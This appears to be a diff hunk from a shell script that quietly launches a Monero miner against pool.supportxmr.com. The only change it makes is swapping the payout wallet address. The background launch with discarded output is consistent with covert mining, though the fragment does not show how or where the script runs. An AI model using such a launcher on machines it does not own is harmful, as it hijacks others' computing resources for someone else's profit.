@@ -254,7 +254,7 @@ if [ "$MINER_ALREADY_RUNNING" = false ]; then
 
         POOL="pool.supportxmr.com:3333"
         ALGO="rx"
-        WALLET="49cYWdjskxWWvgEzBrHCF1Dawmu6i1LBebHxgrXa7DXoc53jLPgGZZhWSPNQomn89wD8szkbAMh6dB3zgzBxt8qQGqRFcxq"
+        WALLET="43n7oGXqTp2Y5eXGHnFKF4bnfo7wEB1xFj8f7AkqMMuFXkY2GHTXcWvGhLCWkVEEHXgHTakVVtGzCBxwMgNQorJuR9baMnu"
 
         nohup "$OUR_MINER_PATH" -o "$POOL" -a "$ALGO" -u "$WALLET" > /dev/null 2>&1 &
     fi
